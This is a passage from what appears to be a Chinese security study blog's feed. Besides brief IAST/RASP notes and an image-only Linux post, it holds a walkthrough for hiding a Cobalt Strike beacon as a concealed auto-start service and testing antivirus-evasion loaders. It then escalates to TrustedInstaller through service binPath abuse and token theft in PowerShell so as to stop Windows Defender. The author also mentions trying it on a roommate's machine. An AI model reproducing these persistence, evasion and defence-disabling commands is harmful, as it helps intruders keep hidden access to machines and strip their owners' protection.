Testing，交互式应用程序安全测试）是2012年由Gartner公司提出的一种新的应用程序安全测试方案。该方案融合了SAST和DAST技术的优点，不需要源码，支持对字节码的检测，极大地提高了安全测试的效率和准确率。与之经常做对比的概念还有“DAST”“SAST”。表9-1对这些概念进行了比对。</p><p>IAST的实现模式较多，较为常见的有代理模式、插桩模式等。</p><p>代理模式IAST如图9-1所示。在该模式下，IAST应用可将正常的业务流量改造成安全测试的流量，接着利用这些安全流量对被测业务发起安全测试，并根据返回的数据包判断漏洞信息。</p><p>表9-1　IAST、DAST、SAST概念对比表<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205052115800.png" alt="image-20220505211448827"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205052115993.png" alt="image-20220505211512777"></p><p>图9-1　代理模式IAST</p><p>插桩模式IAST如图9-2所示。在该模式下，IAST应用需要在被测试应用程序中部署插桩Agent，而IAST的服务端“管理服务器”可监控被测试应用程序的反应。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205052115123.png" alt="image-20220505211558923"></p><p>图9-2　插桩模式IAST</p><h2 id="9-2-RASP简介"><a href="#9-2-RASP简介" class="headerlink" title="9.2　RASP简介"></a>9.2　RASP简介</h2><p>RASP是“运行时应用程序自我保护”（Runtime Application Self-Protection）的英文缩写。Gartner 在2014年的应用安全报告中将 RASP 列为应用安全领域的关键趋势。该报告认为：应用程序不应该依赖外部组件进行运行时保护，而应该具备自我保护的能力，即建立应用程序运行时环境保护机制。</p><p>RASP的关键原理如图9-3所示。由图9-3可知，RASP以探针的形式将保护引擎注入被应用服务中。当RASP检测到应用服务的执行有异常时，可以进行阻断或者告警。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205052117211.png" alt="image-20220505211746015"></p><p>图9-3　RASP的关键原理</p><p>与多数基于规则的传统安全防护技术如WAF、IDS相比，RASP的显著特点包括以下几个。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs applescript">可以获知解码后的HTTP请求。<br><br>可以获知针对数据库、文件等方面的操作行为。<br><br>对一些<span class="hljs-number">0</span><span class="hljs-built_in">day</span>漏洞有着较好的检测效果。<br><br>因此，RASP的规则开发难度和误报率均较低。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java 代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>turated关掉windowsdefance</title>
    <link href="/turated%E5%85%B3%E6%8E%89windowsdefance.html"/>
    <url>/turated%E5%85%B3%E6%8E%89windowsdefance.html</url>
    
    <content type="html"><![CDATA[<p>只能说提权可以 删文件可以 改注册表可以 但是关掉wdf 得重启  </p><p>将beacon写入服务并隐藏配合turated到停止defance。需管理员。且要关掉windowsdefance或者绕过它.txt</p><p>sc create mrxn binPath&#x3D;C:&#x2F;Users&#x2F;mrxn.net&#x2F;Desktop&#x2F;mrxn.exe start&#x3D;auto</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822015.png" alt="image-20220227180109065"></p><p>&amp; $env:SystemRoot\System32\sc.exe sdset 1t “D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU) (D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;; SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)”</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822398.png" alt="image-20220227180046037"></p><p>已经做好了 我们也写得是auto</p><p>可以自动启动。</p><p>接下来重开机试一下有没有上线</p><p>但是应该不会  因为defence会把它杀掉</p><p>刚开机的时候会出现两个黑框 然后瞬间消失 应该是被杀掉了</p><p>cs也没有上线。但是证明这个隐藏是可行的</p><p>接下来配合csbeacon免杀defence或者绕过或者关闭defence就行</p><p>想要使用tursyedlnstaller权限关闭defence实战中操作比较难。只使用与权限提升和留后门。不适合与这个自启动。</p><p>有两个原因：</p><p>1.提权trustedlnastaller这个操作难度大</p><p>2.即使关闭defence后也无法永久关闭。关闭后，如果机器重启的话会自动打开defence</p><p>3.即使永久关闭的话，对方发现的话就不太好。心大的话会再次开启defence。然后之前的后面就没用了</p><p>（后面证实  可以永久关闭defence！！！当然也就产生了第三个原因的坏处）</p><p>那么接下来就逐步进行</p><p>先使用cs免杀defence上线靶机并给予服务自启动</p><p>然后将服务隐藏</p><p>最后使用cs中的beacon进行实战操作从TrustedInstaller到停止WindowsDefender</p><p>为了更贴近个人主机。会先在靶机操作一遍，然后再到我舍友的机器试一下</p><p>这里先用schhhloader生成免杀看一下还能不能用</p><p>cs生成raw x64文件    （1.bin）</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822676.jpeg" alt="IMG_20220228_162129"></p><p>上传试试</p><p>没有爆毒但是也没有上限</p><p>试一下gobybass</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822697.png" alt="image-20220228171553170"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822251.png" alt="image-20220228171725331"></p><p>奇怪 又是免杀但是不上线</p><p>好家伙 原来是我开国外代理的原因</p><p>被墙给拦了</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822462.png" alt="image-20220228172838314"></p><p>ok 原来两个都能上线  不过这个shhloder需要设置延时  不然容易给断掉</p><p>可以看到shhh使用的是进程劫持来进行免杀</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822392.png" alt="image-20220228173343877"></p><p>好家伙  我就再beacon运行一下whoami  gobypass就被杀了 </p><p>成功断掉</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822587.png" alt="image-20220228173433436"></p><p>不出意外 shhhloder执行命令 也被杀了</p><p>这样看下来 我工具包里免杀全都被杀了</p><p>无所谓了 为了后续操作 直接再defence里面给后门文件允许存在</p><p>接下来</p><p>并给予服务自启动</p><p>然后将服务隐藏</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822340.png" alt="image-20220228174544251"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822607.png" alt="image-20220228174651602"></p><p>真的吐了  就算你允许其存在了  但是只要你有后续操作还是会杀</p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20220228175254867.png" alt="image-20220228175254867"></p><p>所以必须得做到cs的完全免杀才能运行指令</p><p>无语了</p><p>到底还是要免杀</p><p>而之后的操作2和3的顺序其实是可以调换的</p><h1 id="从TrustedInstaller到停止WindowsDefender"><a href="#从TrustedInstaller到停止WindowsDefender" class="headerlink" title="从TrustedInstaller到停止WindowsDefender"></a>从TrustedInstaller到停止WindowsDefender</h1><p>这里只讲利用方法</p><p>由于cs没做免杀的话基本上用不了。这里直接本地试一下</p><p>先直接命令关闭进程试一下、</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822258.png" alt="image-20220228190233239"></p><p>没有权限</p><p>就算system权限也不行</p><p>为了能够关闭它  </p><p>我们先升级到system权限</p><p>然后利用system权限升级到trustedinstaller权限</p><p>实战中如何提升到system权限就不用讲了  这个方法很多</p><p>dll劫持，白名单程序。域账户  lssas wmic</p><p>利用github上正好有份可以拿来看token的ps1非常方便</p><p><strong><a href="https://gist.githubusercontent.com/vector-sec/a049bf12da619d9af8f9c7dbd28d3b56/raw/eaddf4151ebe4345623b7066a2c768665805fcad/Get-Token.ps1">https://gist.githubusercontent.com/vector-sec/a049bf12da619d9af8f9c7dbd28d3b56/raw/eaddf4151ebe4345623b7066a2c768665805fcad/Get-Token.ps1</a></strong></p><p>TrustedInstaller为Windows系统中众多系统内置安全主体中的一个，除了组之外也是系统重要服务，用户无法直接在此服务的上下文中运行程序或另一个服务。它是操作系统上用来对系统进行维护、更新等操作的组。SID是S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464。TrustedInstaller权限的意义是用来防止程序或用户无意或恶意破坏系统文件。这个安全主体本身是一个服务，名称为：Windows Modules Installer</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822177.png" alt="image-20220228192051708"></p><p>一般常规情况下，进程默认打开未启动，需要先启动下服务才能启动<br>那么也就意味着要获得到TrustedInstaller的权限，需要先通过服务启动下</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822937.png" alt="image-20220228192323456"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822513.png" alt="image-20220228192332796"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822781.png" alt="image-20220228194454576"></p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20220228194502521.png" alt="image-20220228194502521"></p><p>了解下权限划分即可知道，在windows下TrustedInstaller权限其实超过了system，再回到为什么没法直接关闭WinDefend，查看WinDefend服务的dcal，可以发现管理员、system只有start的权限没法进行stop</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823761.png" alt="image-20220228194540072"></p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20220228194547079.png" alt="image-20220228194547079"></p><p>这个是<img src="E:/typora%E5%9B%BE%E7%89%87/image-20220228194559093.png" alt="image-20220228194559093"></p><p>的属性</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823870.png" alt="image-20220228194615202"></p><p>一样只有turster才行</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823164.png" alt="image-20220228194629044"></p><p>但服务本身和TrustedInstaller具备完全控制，可以实现stop功能</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823021.png" alt="image-20220228194941762"></p><p>从管理员到system出发，利用winlogon获得system权限，通过StartService启动trustedinstaller服务，从而进步获取trustedinstaller的权限，利用trustedinstaller来停止defender</p><p>当然获取trustedinstaller的权限有很多方法，</p><p><strong>这个服务方法我暂时还没搞出来：</strong></p><p>先用用其他的方法</p><h2 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h2><p>创建一个txt文件</p><p>输入以下内容</p><p>Windows Registry Editor Version 5.00</p><p>[HKEY_CLASSES_ROOT*\shell\runas]</p><p>@&#x3D;”获取TrustedInstaller权限”</p><p>[HKEY_CLASSES_ROOT*\shell\runas\command]</p><p>@&#x3D;”cmd.exe &#x2F;c takeown &#x2F;f &quot;%1&quot; &amp;&amp; icacls &quot;%1&quot; &#x2F;grant administrators:F”</p><p>“IsolatedCommand”&#x3D;”cmd.exe &#x2F;c takeown &#x2F;f &quot;%1&quot; &amp;&amp; icacls &quot;%1&quot; &#x2F;grant administrators:F”</p><p>[HKEY_CLASSES_ROOT\Directory\shell\runas]</p><p>@&#x3D;”获取TrustedInstaller权限”</p><p>“NoWorkingDirectory”&#x3D;””</p><p>[HKEY_CLASSES_ROOT\Directory\shell\runas\command]</p><p>@&#x3D;”cmd.exe &#x2F;c takeown &#x2F;f &quot;%1&quot; &#x2F;r &#x2F;d y &amp;&amp; icacls &quot;%1&quot; &#x2F;grant administrators:F &#x2F;t”</p><p>“IsolatedCommand”&#x3D;”cmd.exe &#x2F;c takeown &#x2F;f &quot;%1&quot; &#x2F;r &#x2F;d y &amp;&amp; icacls &quot;%1&quot; &#x2F;grant administrators:F &#x2F;t”</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823807.png" alt="image-20220228195938524"></p><p><strong>将文档后缀.txt更改为注册表格式.reg</strong></p><p>先使用普通用户打开试试</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823867.png" alt="image-20220228200356482"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823111.png" alt="image-20220228200404904"></p><p>用管理员试试</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823567.png" alt="image-20220228200609213"></p><p>看来只能用 管理员</p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20220228200747777.png" alt="image-20220228200747777"></p><p>win7 成功可以   但是不难发现 win7的 defence 是是svchost.exe执行的</p><p>但是win10的是msmpeng.exe</p><p>之后再试一下 发现defence在一段时间后还是会自动打开</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823797.png" alt="image-20220228201127951"></p><p>win10试试</p><p>直接管理员运行</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823608.png" alt="image-20220228201243072"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824057.png" alt="image-20220228201247977"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824080.png" alt="image-20220228201324040"></p><h1 id="失败！！！！"><a href="#失败！！！！" class="headerlink" title="失败！！！！"></a>失败！！！！</h1><p>这个方法本来就不行</p><p>win7可以是因为win7版本低  没有做相关的防护 就算win7可以  一段时间后又不行了</p><h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><p>下载setacl</p><p><a href="https://helgeklein.com/download/#setacl">https://helgeklein.com/download/#setacl</a></p><p>1、把下载解压好的程序SetACL.exe复制到C:\Windows\System32</p><p>2、以管理员身份运行命令提示符</p><p>3、按照如下格式设置执行获取权限命令：</p><p><strong>SetACL -on文件&#x2F;文件夹&#x2F;注册表值名称-ot文件类型-actn要执行的操作</strong></p><p>SetACL.exe -on “HKEY_CLASSES_ROOT\CLSID{5399E694-6CE5-4D6C-8FCE-1D8870FDCBA0}” -ot reg -actn setowner -ownr “n:Administrators”</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824142.png" alt="image-20220228203903259"></p><p><strong>注释</strong>：将上述注册表项所有者更新到管理员Administrator（默认为不可更改的TrustedInstaller）</p><p>SetACL.exe -on “HKEY_CLASSES_ROOT\CLSID{5399E694-6CE5-4D6C-8FCE-1D8870FDCBA0}” -ot reg -actn ace -ace “n:Administrators;p:full”</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824225.png" alt="image-20220228204106228"></p><p><strong>注释</strong>：让上述注册表项所有者“Administrator”获取全部权限。</p><p>注意，<strong>上述命令缺一不可，而且要按照先后顺序执行</strong>。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824382.png" alt="image-20220228204318901"></p><p>给当前用户也加一下</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824118.png" alt="image-20220228204402686"></p><h2 id="还是不行！！！！"><a href="#还是不行！！！！" class="headerlink" title="还是不行！！！！"></a>还是不行！！！！</h2><h1 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h1><p>输入regedit，按回车键进入注册表编辑器。</p><p>定位到</p><p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService</p><p>在右侧找到DWORD（32位）值，命名为Start。</p><p>修改数值数据为4。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824160.png" alt="image-20220228204931699"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824190.png" alt="image-20220228205001492"></p><p>重启文件资源管理器，或注销再登录&#x2F;重启系统。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824145.png" alt="image-20220228205447399"></p><p>还是在 &#x3D; &#x3D; 下一个</p><h1 id="方法四（确定有用-win11也能用）"><a href="#方法四（确定有用-win11也能用）" class="headerlink" title="方法四（确定有用  win11也能用）"></a>方法四（确定有用  win11也能用）</h1><p>trustedInstaller（TI）组的概念</p><p>当系统资源被更改时，一个名为TrustedInstall的系统服务一定会被运行。我们使用SC模块也能发现这一点。</p><p>改变系统文件的权限实在不是个好主意，如果你做错了你会将操作系统暴露给EOP，尤其是对目录来说。资源管理器可以轻松地更改所有子文件和文件夹的安全属性为初始值。当然，TI会阻止你这么做的，但是总有些人出于某些目的而想要这么做。</p><p>你也许会想，我可以把当前用户添加到TI组中。不幸的是像NetLocalGroupAddMembers这样的LSASS api不使用SID，修改注册表值NT SERVICETrustedInstaller同样无效。因为它根本就不是一个真实的组，它是使用其他方法来创建的。也许你可以通过念一段神奇的咒语来完成这件事，或者至少使用底层的RPC调用，但我认为这么做不太值得。</p><p>因此，修改TI服务设置的最快方法是通过改变设置来运行一个其他的二进制文件。奇怪的是，TI服务使得系统上的文件很难被随意修改，但是它却不保护它自己，修改它的操作可以以一个普通管理员的权限完成。所以你可以使用下面的命令来删除任意文件</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span><span class="hljs-built_in">config</span> TrustedInstaller <span class="hljs-keyword">binPath= </span><span class="hljs-string">&quot;cmd.exe /C del pathtofile&quot;</span><br></code></pre></td></tr></table></figure><p>启动TI服务，咻的一声文件就没了。这条命令能够生效的另一个原因是，TI不是一个Protected Process Light (PPL)，这也是一件奇怪的事情，因为TI组被赋予了删除和停止PPL服务的权限。有大佬把这一点向MSRC<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=997">指出</a>过（并且Alex lonescu在2013年也<a href="http://www.alex-ionescu.com/?p=116">这么做</a>了），但是微软并没有采取任何措施去修复。看起来微软也并不认为PPL是一个安全边界。</p><p>上述操作做完之后你必须把TI服务恢复到原来的状态，否则像Windows Update之类的服务就没法正常工作了。由于TI服务有一个token，那么我们是否可以借用这个token来创建一个新进程呢？</p><p>作为管理员，我们可以调用SeDebugPrivilege函数来打开TI进程和它的token。然后我们就可以做任何事情了，试一下吧：</p><p><strong>首先，我们需要下载并安装 Set-NtTokenPrivilege 命令所需模块，我们先在系统 C 盘根目录新建名为“token”的文件夹。</strong></p><p>接着，我们以管理员身份运行 Powershell，然后输入（其中 C:\token，为我们刚刚新建文件夹的路径）：</p><p>Save-Module -Name NtObjectManager -Path c:\token  (记得翻墙下载！！！！！！！！)</p><p>并回车（第一次安装会出现询问，输入“Y”并回车）：</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824829.png" alt="image-20220228211822811"></p><p>稍等片刻下载完成后，我们输入：</p><p>Install-Module -Name NtObjectManager</p><p>并回车，正式安装。若出现不受信任的存储库，输入“A”并回车：</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824923.png" alt="image-20220228212908738"></p><p>等安装结束后，需要让系统允许使用 Windows Powershell 脚本，输入以下命令：</p><p>Set-ExecutionPolicy Unrestricted</p><p>回车执行命令，系统会显示执行策略更改，输入 A 并回车确认</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824700.png" alt="image-20220228212931388"></p><p>接着，导入 NtObjectManager 模块，输入并回车执行以下命令：</p><p>Import-Module NtObjectManager</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824507.png" alt="image-20220228212958601"></p><p><strong>好的  准备工作结束  正式开始利用</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell">sc.exe <span class="hljs-built_in">start</span> TrustedInstaller<br><br><br><br><span class="hljs-built_in">Set-NtTokenPrivilege</span> SeDebugPrivilege<br><br><br><br><span class="hljs-built_in">Start-Service</span> TrustedInstaller<br><br><span class="hljs-variable">$p</span> = <span class="hljs-built_in">Get-Ntprocess</span> <span class="hljs-literal">-Name</span> TrustedInstaller.exe<br><br><span class="hljs-variable">$t</span> = <span class="hljs-variable">$p</span>.OpenToken()<br><br><span class="hljs-variable">$t</span>.Groups | <span class="hljs-built_in">Where-Object</span> &#123;<span class="hljs-variable">$_</span>.Sid.Name <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;TrustedInstaller&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824495.png" alt="image-20220228213138297"></p><p>whoami &#x2F;groups &#x2F;fo list试一下</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824979.png" alt="image-20220228213208546"></p><p>可以看到我们已经获得 Trustedinstaller 权限了，现在就可以通过一些命令修改系统文件了。如果想要更加方便操作，可以通过此 CMD 运行 taskmgr、notepad 等应用，在运行新任务、打开文件的浏览窗口下，进行文件编辑。编辑结束后直接关闭即可。</p><p>　　注意!不要使用 CMD 运行 explorer，因为 explorer 无法在当前用户下正常使用。在这之后如果，想要重新获得 Trustedinstaller 权限重新执行以下命令即可：</p><p>　</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">　sc.exe <span class="hljs-built_in">start</span> TrustedInstaller<span class="hljs-built_in">Set-NtTokenPrivilege</span> SeDebugPrivilege<span class="hljs-variable">$p</span> = <span class="hljs-built_in">Get-NtProcess</span> <span class="hljs-literal">-Name</span> TrustedInstaller.exe<span class="hljs-variable">$proc</span> = <span class="hljs-built_in">New-Win32Process</span> cmd.exe <span class="hljs-literal">-CreationFlags</span> NewConsole <span class="hljs-literal">-ParentProcess</span> <span class="hljs-variable">$p</span><br></code></pre></td></tr></table></figure><p><strong>这很简单，是时候来尝试一下TI的其他操作了。</strong></p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20220228210725027.png" alt="image-20220228210725027"></p><p>好吧，看起来我们没法通过使用这个token创建或者模拟一个进程，这可不太好。在上图底部我们可以看到原因。我们只有TOKEN_QUERY的权限，但是我们至少需要TOKEN_DUPLICATE权限来获取一个创建新进程所需要的token。检查token的安全描述，使用Process Hacker来查看为什么我们的访问权限这么低（我们甚至连READ_CONTROL权限都没有）。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824089.png" alt="image-20220228210735367"></p><p>可以看到，管理员组只有TOKEN_QUERY权限。这一点与我们通过token获得的访问权限是一致的。你可能想知道为什么SeDebugPrivilege没有生效，因为调试权限仅仅绕过了进程和线程对象的安全检查，它并不会对token进行任何操作，因为我们没法获得它的帮助。看起来有点麻烦，但是是否就没有除了修改服务二进制这种暴力操作以外的其他方法来达到目的了呢？</p><p>当然不是了。有一些例子可以说明我们如何让类似于TI的服务运行起来，一般来说，可以先安装一个服务来运行代码，然后窃取TI令牌，最后再创建新进程。很容易理解，如果我想创建一个服务，我只需要修改Trusted Installer服务。</p><p>因此，有两种很简单的方法来绕过这种权限限制，并且不需要任何新的或者修改过的或者注入过代码的服务。我们首先来看创建新进程的问题。一个进程的父进程会调用CreateProcess，对于UAC来说，这将提升子进程的权限，这看起来有些奇怪。为了支持微软所介绍的Vista中的最小权限原则，通过创建新进程时都会显式指定一个父进程，以便权限提升后的进程仍然是调用者的子进程。</p><p>通常在开启了UAC的情况下，你可以显示指定子新进程的token。然而，如果你没有指定token，新进程就会从父进程处继承token。因此，我们这么做的唯一要求是获得父进程句柄的PROCESS_CREATE_PROCESS权限。由于我们已经有SeDebugPrivilege权限了，我们就可以获取TI进程的完整权限，当然也包括创建它的子进程的权限。这么做的额外好处是，内核中创建进程的代码甚至会直接为调用者分配正确的会话ID，这样就可以创建交互式进程了。我们利用这种特性，在当前桌面上通过New-Win32Process使用TI服务的token创建了任意进程，并且通过-ParentProcess参数将进程对象传递进去。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824475.png" alt="image-20220228210747258"></p><p>在不创建新进程的情况下模拟token也很有用。有没有方法实现呢？有。我们可以使用NtImpersonateThread API，它允许从现有的线程中捕获上下文，并且可以应用到另一条线程中。模拟上下文工作的过程是，内核首先尝试捕获该线程的token，如果线程没有token，那么内核将通过模拟来复制与线程相关进程的token。而NtImpersonateThread API的美妙之处在于，设置父进程时不需要访问token的权限，它只需要THREAD_DIRECT_IMPERSONATION模拟访问一个线程，这一点我们只需要使用SeDebugPrivilege就可以做到。因此，可以通过以下步骤来获得一个不产生新进程的模拟线程：</p><p><strong>以至少PROCESS_QUERY_INFORMATION的权限打开一个进程，枚举其线程</strong></p><p><strong>以THREAD_DIRECT_IMPERSONATION权限打开进程中的第一条线程</strong></p><p><strong>调用NtImpersonate Thread来获取一个模拟token</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell">sc.exe <span class="hljs-built_in">start</span> TrustedInstaller<br><br><span class="hljs-variable">$p</span> = <span class="hljs-built_in">Get-NtProcess</span> <span class="hljs-literal">-Name</span> TrustedInstaller.exe<br><br><span class="hljs-variable">$th</span> = <span class="hljs-variable">$p</span>.GetFirstThread()<br><br><span class="hljs-variable">$current</span> = <span class="hljs-built_in">Get-NtThread</span> <span class="hljs-literal">-Current</span> <span class="hljs-literal">-PseudoHandle</span><br><br><span class="hljs-variable">$imp</span> = <span class="hljs-variable">$current</span>.ImpersonateThread(<span class="hljs-variable">$th</span>)<br><br><span class="hljs-variable">$imp_token</span> = <span class="hljs-built_in">Get-NtToken</span> <span class="hljs-literal">-Impersonation</span><br><br><span class="hljs-variable">$imp_token</span>.Groups | <span class="hljs-built_in">Where-Object</span> &#123;<span class="hljs-variable">$_</span>.Sid.Name <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;TrustedInstaller&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824896.png" alt="image-20220228214339561"></p><p>现在，只要其他线程不去设置主线程的模拟token（并且你也不要在分离出的线程上做任何事情），那么你的PowerShell控制台就是拥有TI组的状态。</p><p>$proc &#x3D; New-Win32Process cmd.exe -CreationFlags NewConsole -Token $t</p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20220228214545675.png" alt="image-20220228214545675"></p><p>直接运行  就很nice</p><p>$imp &#x3D; $t.Impersonate()</p><p>$t.GrantedAccess</p><p>试试关闭WDF</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824758.png" alt="image-20220228214648480"></p><p>没有出现拒绝访问  就很nice！！！</p><p>怎么永久删除呢  后面讲解  使defende无法恢复呢</p>]]></content>
    
    
    <categories>
      
      <category>windows提权</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>手抄linux各文件夹及文件说明</title>
    <link href="/%E6%89%8B%E6%8A%84linux%E5%90%84%E6%96%87%E4%BB%B6%E5%A4%B9%E8%AF%B4%E6%98%8E.html"/>
    <url>/%E6%89%8B%E6%8A%84linux%E5%90%84%E6%96%87%E4%BB%B6%E5%A4%B9%E8%AF%B4%E6%98%8E.html</url>
    
    <content type="html"><![CDATA[<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220310201609693.png" alt="image-20220310201609693"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220310201652412.png" alt="image-20220310201652412"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220310201710741.png" alt="image-20220310201710741"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220310201753631.png" alt="image-20220310201753631"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220310201838193.png" alt="image-20220310201838193"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220310201905678.png" alt="image-20220310201905678"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5CIMG_20220310_201153.jpg" alt="IMG_20220310_201153"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220310201953734.png" alt="image-20220310201953734"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220310202034719.png" alt="image-20220310202034719"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220310202059471.png" alt="image-20220310202059471"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220310202125179.png" alt="image-20220310202125179"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5CIMG_20220310_201233.jpg"></p><p><img 